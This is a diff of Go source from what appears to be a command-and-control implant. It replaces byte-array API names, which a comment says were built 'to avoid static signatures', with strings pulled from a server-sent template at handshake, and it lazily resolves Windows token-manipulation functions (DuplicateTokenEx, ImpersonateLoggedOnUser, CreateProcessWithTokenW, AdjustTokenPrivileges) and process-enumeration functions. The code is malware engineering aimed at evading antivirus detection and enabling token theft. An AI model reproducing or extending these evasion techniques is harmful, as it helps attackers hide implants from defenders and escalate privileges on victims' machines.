@@ -78,94 +78,141 @@ const (
 	SE_PRIVILEGE_ENABLED = 0x00000002
 )
 
-// Windows API strings (constructed to avoid static signatures)
-var (
-	// DLL names
-	wcDllAdvapi32 = string([]byte{0x61, 0x64, 0x76, 0x61, 0x70, 0x69, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})                                                                                                       // advapi32.dll
-	wcDllKernel32 = string([]byte{0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})                                                                                                       // kernel32.dll
-	wcDllNtdll    = string([]byte{0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c})                                                                                                                         // ntdll.dll
-	wcDllUser32   = string([]byte{0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c})                                                                                                                   // user32.dll
-	wcDllPsapi    = string([]byte{0x70, 0x73, 0x61, 0x70, 0x69, 0x2e, 0x64, 0x6c, 0x6c})                                                                                                                         // psapi.dll
+// Template indices for windows common strings - must match server's common.go
+const (
+	// DLL names (1020-1024)
+	idxWcDllAdvapi32 = 1020
+	idxWcDllKernel32 = 1021
+	idxWcDllNtdll    = 1022
+	idxWcDllUser32   = 1023
+	idxWcDllPsapi    = 1024
 
-	// Advapi32 function names
-	wcFnGetUserNameW              = string([]byte{0x47, 0x65, 0x74, 0x55, 0x73, 0x65, 0x72, 0x4e, 0x61, 0x6d, 0x65, 0x57})                                                                                       // GetUserNameW
-	wcFnOpenProcessToken          = string([]byte{0x4f, 0x70, 0x65, 0x6e, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x54, 0x6f, 0x6b, 0x65, 0x6e})                                                               // OpenProcessToken
-	wcFnOpenThreadToken           = string([]byte{0x4f, 0x70, 0x65, 0x6e, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x54, 0x6f, 0x6b, 0x65, 0x6e})                                                                     // OpenThreadToken
-	wcFnDuplicateTokenEx          = string([]byte{0x44, 0x75, 0x70, 0x6c, 0x69, 0x63, 0x61, 0x74, 0x65, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x45, 0x78})                                                               // DuplicateTokenEx
-	wcFnImpersonateLoggedOnUser   = string([]byte{0x49, 0x6d, 0x70, 0x65, 0x72, 0x73, 0x6f, 0x6e, 0x61, 0x74, 0x65, 0x4c, 0x6f, 0x67, 0x67, 0x65, 0x64, 0x4f, 0x6e, 0x55, 0x73, 0x65, 0x72})                     // ImpersonateLoggedOnUser
-	wcFnRevertToSelf              = string([]byte{0x52, 0x65, 0x76, 0x65, 0x72, 0x74, 0x54, 0x6f, 0x53, 0x65, 0x6c, 0x66})                                                                                       // RevertToSelf
-	wcFnGetTokenInformation       = string([]byte{0x47, 0x65, 0x74, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x49, 0x6e, 0x66, 0x6f, 0x72, 0x6d, 0x61, 0x74, 0x69, 0x6f, 0x6e})                                             // GetTokenInformation
-	wcFnLookupAccountSidW         = string([]byte{0x4c, 0x6f, 0x6f, 0x6b, 0x75, 0x70, 0x41, 0x63, 0x63, 0x6f, 0x75, 0x6e, 0x74, 0x53, 0x69, 0x64, 0x57})                                                         // LookupAccountSidW
-	wcFnLogonUserW                = string([]byte{0x4c, 0x6f, 0x67, 0x6f, 0x6e, 0x55, 0x73, 0x65, 0x72, 0x57})                                                                                                   // LogonUserW
-	wcFnLogonUserExW              = string([]byte{0x4c, 0x6f, 0x67, 0x6f, 0x6e, 0x55, 0x73, 0x65, 0x72, 0x45, 0x78, 0x57})                                                                                       // LogonUserExW
-	wcFnCreateProcessAsUserW      = string([]byte{0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x41, 0x73, 0x55, 0x73, 0x65, 0x72, 0x57})                                       // CreateProcessAsUserW
-	wcFnCreateProcessWithTokenW   = string([]byte{0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x57, 0x69, 0x74, 0x68, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x57})                     // CreateProcessWithTokenW
-	wcFnAdjustTokenPrivileges     = string([]byte{0x41, 0x64, 0x6a, 0x75, 0x73, 0x74, 0x54, 0x6f, 0x6b, 0x65, 0x6e, 0x50, 0x72, 0x69, 0x76, 0x69, 0x6c, 0x65, 0x67, 0x65, 0x73})                                 // AdjustTokenPrivileges
-	wcFnLookupPrivilegeValueW     = string([]byte{0x4c, 0x6f, 0x6f, 0x6b, 0x75, 0x70, 0x50, 0x72, 0x69, 0x76, 0x69, 0x6c, 0x65, 0x67, 0x65, 0x56, 0x61, 0x6c, 0x75, 0x65, 0x57})                                 // LookupPrivilegeValueW
+	// Advapi32 function names (1025-1038)
+	idxWcFnGetUserNameW            = 1025
+	idxWcFnOpenProcessToken        = 1026
+	idxWcFnOpenThreadToken         = 1027
+	idxWcFnDuplicateTokenEx        = 1028
+	idxWcFnImpersonateLoggedOnUser = 1029
+	idxWcFnRevertToSelf            = 1030
+	idxWcFnGetTokenInformation     = 1031
+	idxWcFnLookupAccountSidW       = 1032
+	idxWcFnLogonUserW              = 1033
+	idxWcFnLogonUserExW            = 1034
+	idxWcFnCreateProcessAsUserW    = 1035
+	idxWcFnCreateProcessWithTokenW = 1036
+	idxWcFnAdjustTokenPrivileges   = 1037
+	idxWcFnLookupPrivilegeValueW   = 1038
 
-	// Kernel32 function names
-	wcFnOpenProcess              = string([]byte{0x4f, 0x70, 0x65, 0x6e, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73})                                                                                             // OpenProcess
-	wcFnCloseHandle              = string([]byte{0x43, 0x6c, 0x6f, 0x73, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65})                                                                                             // CloseHandle
-	wcFnGetCurrentProcess        = string([]byte{0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73})                                                         // GetCurrentProcess
-	wcFnGetCurrentProcessId      = string([]byte{0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x49, 0x64})                                             // GetCurrentProcessId
-	wcFnGetCurrentThread         = string([]byte{0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6e, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64})                                                               // GetCurrentThread
-	wcFnTerminateProcess         = string([]byte{0x54, 0x65, 0x72, 0x6d, 0x69, 0x6e, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73})                                                               // TerminateProcess
-	wcFnGetExitCodeProcess       = string([]byte{0x47, 0x65, 0x74, 0x45, 0x78, 0x69, 0x74, 0x43, 0x6f, 0x64, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73})                                                   // GetExitCodeProcess
-	wcFnWaitForSingleObject      = string([]byte{0x57, 0x61, 0x69, 0x74, 0x46, 0x6f, 0x72, 0x53, 0x69, 0x6e, 0x67, 0x6c, 0x65, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74})                                             // WaitForSingleObject
-	wcFnCreateToolhelp32Snapshot = string([]byte{0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x6f, 0x6f, 0x6c, 0x68, 0x65, 0x6c, 0x70, 0x33, 0x32, 0x53, 0x6e, 0x61, 0x70, 0x73, 0x68, 0x6f, 0x74})               // CreateToolhelp32Snapshot
-	wcFnProcess32FirstW          = string([]byte{0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x33, 0x32, 0x46, 0x69, 0x72, 0x73, 0x74, 0x57})                                                                     // Process32FirstW
-	wcFnProcess32NextW           = string([]byte{0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x33, 0x32, 0x4e, 0x65, 0x78, 0x74, 0x57})                                                                           // Process32NextW
-	wcFnGetEnvironmentStringsW   = string([]byte{0x47, 0x65, 0x74, 0x45, 0x6e, 0x76, 0x69, 0x72, 0x6f, 0x6e, 0x6d, 0x65, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x57})                           // GetEnvironmentStringsW
-	wcFnFreeEnvironmentStringsW  = string([]byte{0x46, 0x72, 0x65, 0x65, 0x45, 0x6e, 0x76, 0x69, 0x72, 0x6f, 0x6e, 0x6d, 0x65, 0x6e, 0x74, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x73, 0x57})                     // FreeEnvironmentStringsW
+	// Kernel32 function names (1039-1051)
+	idxWcFnOpenProcess              = 1039
+	idxWcFnCloseHandle              = 1040
+	idxWcFnGetCurrentProcess        = 1041
+	idxWcFnGetCurrentProcessId      = 1042
+	idxWcFnGetCurrentThread         = 1043
+	idxWcFnTerminateProcess         = 1044
+	idxWcFnGetExitCodeProcess       = 1045
+	idxWcFnWaitForSingleObject      = 1046
+	idxWcFnCreateToolhelp32Snapshot = 1047
+	idxWcFnProcess32FirstW          = 1048
+	idxWcFnProcess32NextW           = 1049
+	idxWcFnGetEnvironmentStringsW   = 1050
+	idxWcFnFreeEnvironmentStringsW  = 1051
 )
 
-// Windows API DLLs
+// wcTpl safely retrieves a windows common string from the comms template
+func wcTpl(idx int) string {
+	return globalCommsTpl.Get(idx)
+}
+
+// Windows API DLLs - lazily initialized after template received
 var (
-	modAdvapi32 = syscall.NewLazyDLL(wcDllAdvapi32)
-	modKernel32 = syscall.NewLazyDLL(wcDllKernel32)
-	modNtdll    = syscall.NewLazyDLL(wcDllNtdll)
-	modUser32   = syscall.NewLazyDLL(wcDllUser32)
-	modPsapi    = syscall.NewLazyDLL(wcDllPsapi)
+	modAdvapi32 *syscall.LazyDLL
+	modKernel32 *syscall.LazyDLL
+	modNtdll    *syscall.LazyDLL
+	modUser32   *syscall.LazyDLL
+	modPsapi    *syscall.LazyDLL
 )
 
 // Windows API functions - Token Management
 var (
-	procGetUserNameW            = modAdvapi32.NewProc(wcFnGetUserNameW)
-	procOpenProcessToken        = modAdvapi32.NewProc(wcFnOpenProcessToken)
-	procOpenThreadToken         = modAdvapi32.NewProc(wcFnOpenThreadToken)
-	procDuplicateTokenEx        = modAdvapi32.NewProc(wcFnDuplicateTokenEx)
-	procImpersonateLoggedOnUser = modAdvapi32.NewProc(wcFnImpersonateLoggedOnUser)
-	procRevertToSelf            = modAdvapi32.NewProc(wcFnRevertToSelf)
-	procGetTokenInformation     = modAdvapi32.NewProc(wcFnGetTokenInformation)
-	procLookupAccountSidW       = modAdvapi32.NewProc(wcFnLookupAccountSidW)
-	procLogonUserW              = modAdvapi32.NewProc(wcFnLogonUserW)
-	procLogonUserExW            = modAdvapi32.NewProc(wcFnLogonUserExW)
-	procCreateProcessAsUserW    = modAdvapi32.NewProc(wcFnCreateProcessAsUserW)
-	procCreateProcessWithTokenW = modAdvapi32.NewProc(wcFnCreateProcessWithTokenW)
-	procAdjustTokenPrivileges   = modAdvapi32.NewProc(wcFnAdjustTokenPrivileges)
-	procLookupPrivilegeValueW   = modAdvapi32.NewProc(wcFnLookupPrivilegeValueW)
+	procGetUserNameW            *syscall.LazyProc
+	procOpenProcessToken        *syscall.LazyProc
+	procOpenThreadToken         *syscall.LazyProc
+	procDuplicateTokenEx        *syscall.LazyProc
+	procImpersonateLoggedOnUser *syscall.LazyProc
+	procRevertToSelf            *syscall.LazyProc
+	procGetTokenInformation     *syscall.LazyProc
+	procLookupAccountSidW       *syscall.LazyProc
+	procLogonUserW              *syscall.LazyProc
+	procLogonUserExW            *syscall.LazyProc
+	procCreateProcessAsUserW    *syscall.LazyProc
+	procCreateProcessWithTokenW *syscall.LazyProc
+	procAdjustTokenPrivileges   *syscall.LazyProc
+	procLookupPrivilegeValueW   *syscall.LazyProc
 )
 
 // Windows API functions - Process Management
 var (
-	procOpenProcess              = modKernel32.NewProc(wcFnOpenProcess)
-	procCloseHandle              = modKernel32.NewProc(wcFnCloseHandle)
-	procGetCurrentProcess        = modKernel32.NewProc(wcFnGetCurrentProcess)
-	procGetCurrentProcessId      = modKernel32.NewProc(wcFnGetCurrentProcessId)
-	procGetCurrentThread         = modKernel32.NewProc(wcFnGetCurrentThread)
-	procTerminateProcess         = modKernel32.NewProc(wcFnTerminateProcess)
-	procGetExitCodeProcess       = modKernel32.NewProc(wcFnGetExitCodeProcess)
-	procWaitForSingleObject      = modKernel32.NewProc(wcFnWaitForSingleObject)
-	procCreateToolhelp32Snapshot = modKernel32.NewProc(wcFnCreateToolhelp32Snapshot)
-	procProcess32FirstW          = modKernel32.NewProc(wcFnProcess32FirstW)
-	procProcess32NextW           = modKernel32.NewProc(wcFnProcess32NextW)
+	procOpenProcess              *syscall.LazyProc
+	procCloseHandle              *syscall.LazyProc
+	procGetCurrentProcess        *syscall.LazyProc
+	procGetCurrentProcessId      *syscall.LazyProc
+	procGetCurrentThread         *syscall.LazyProc
+	procTerminateProcess         *syscall.LazyProc
+	procGetExitCodeProcess       *syscall.LazyProc
+	procWaitForSingleObject      *syscall.LazyProc
+	procCreateToolhelp32Snapshot *syscall.LazyProc
+	procProcess32FirstW          *syscall.LazyProc
+	procProcess32NextW           *syscall.LazyProc
 )
 
 // Windows API functions - Environment
 var (
-	procGetEnvironmentStringsW  = modKernel32.NewProc(wcFnGetEnvironmentStringsW)
-	procFreeEnvironmentStringsW = modKernel32.NewProc(wcFnFreeEnvironmentStringsW)
+	procGetEnvironmentStringsW  *syscall.LazyProc
+	procFreeEnvironmentStringsW *syscall.LazyProc
 )
+
+// initWindowsCommonAPIs initializes the Windows API DLLs and procs from template strings
+// Must be called after globalCommsTpl is set during handshake
+func initWindowsCommonAPIs() {
+	// Initialize DLLs
+	modAdvapi32 = syscall.NewLazyDLL(wcTpl(idxWcDllAdvapi32))
+	modKernel32 = syscall.NewLazyDLL(wcTpl(idxWcDllKernel32))
+	modNtdll = syscall.NewLazyDLL(wcTpl(idxWcDllNtdll))
+	modUser32 = syscall.NewLazyDLL(wcTpl(idxWcDllUser32))
+	modPsapi = syscall.NewLazyDLL(wcTpl(idxWcDllPsapi))
+
+	// Initialize Advapi32 procs
+	procGetUserNameW = modAdvapi32.NewProc(wcTpl(idxWcFnGetUserNameW))
+	procOpenProcessToken = modAdvapi32.NewProc(wcTpl(idxWcFnOpenProcessToken))
+	procOpenThreadToken = modAdvapi32.NewProc(wcTpl(idxWcFnOpenThreadToken))
+	procDuplicateTokenEx = modAdvapi32.NewProc(wcTpl(idxWcFnDuplicateTokenEx))
+	procImpersonateLoggedOnUser = modAdvapi32.NewProc(wcTpl(idxWcFnImpersonateLoggedOnUser))
+	procRevertToSelf = modAdvapi32.NewProc(wcTpl(idxWcFnRevertToSelf))
+	procGetTokenInformation = modAdvapi32.NewProc(wcTpl(idxWcFnGetTokenInformation))
+	procLookupAccountSidW = modAdvapi32.NewProc(wcTpl(idxWcFnLookupAccountSidW))
+	procLogonUserW = modAdvapi32.NewProc(wcTpl(idxWcFnLogonUserW))
+	procLogonUserExW = modAdvapi32.NewProc(wcTpl(idxWcFnLogonUserExW))
+	procCreateProcessAsUserW = modAdvapi32.NewProc(wcTpl(idxWcFnCreateProcessAsUserW))
+	procCreateProcessWithTokenW = modAdvapi32.NewProc(wcTpl(idxWcFnCreateProcessWithTokenW))
+	procAdjustTokenPrivileges = modAdvapi32.NewProc(wcTpl(idxWcFnAdjustTokenPrivileges))
+	procLookupPrivilegeValueW = modAdvapi32.NewProc(wcTpl(idxWcFnLookupPrivilegeValueW))
+
+	// Initialize Kernel32 procs
+	procOpenProcess = modKernel32.NewProc(wcTpl(idxWcFnOpenProcess))
+	procCloseHandle = modKernel32.NewProc(wcTpl(idxWcFnCloseHandle))
+	procGetCurrentProcess = modKernel32.NewProc(wcTpl(idxWcFnGetCurrentProcess))
+	procGetCurrentProcessId = modKernel32.NewProc(wcTpl(idxWcFnGetCurrentProcessId))
+	procGetCurrentThread = modKernel32.NewProc(wcTpl(idxWcFnGetCurrentThread))
+	procTerminateProcess = modKernel32.NewProc(wcTpl(idxWcFnTerminateProcess))
+	procGetExitCodeProcess = modKernel32.NewProc(wcTpl(idxWcFnGetExitCodeProcess))
+	procWaitForSingleObject = modKernel32.NewProc(wcTpl(idxWcFnWaitForSingleObject))
+	procCreateToolhelp32Snapshot = modKernel32.NewProc(wcTpl(idxWcFnCreateToolhelp32Snapshot))
+	procProcess32FirstW = modKernel32.NewProc(wcTpl(idxWcFnProcess32FirstW))
+	procProcess32NextW = modKernel32.NewProc(wcTpl(idxWcFnProcess32NextW))
+	procGetEnvironmentStringsW = modKernel32.NewProc(wcTpl(idxWcFnGetEnvironmentStringsW))
+	procFreeEnvironmentStringsW = modKernel32.NewProc(wcTpl(idxWcFnFreeEnvironmentStringsW))
+}
 
 // PROCESSENTRY32 structure for process enumeration
 type PROCESSENTRY32 struct {
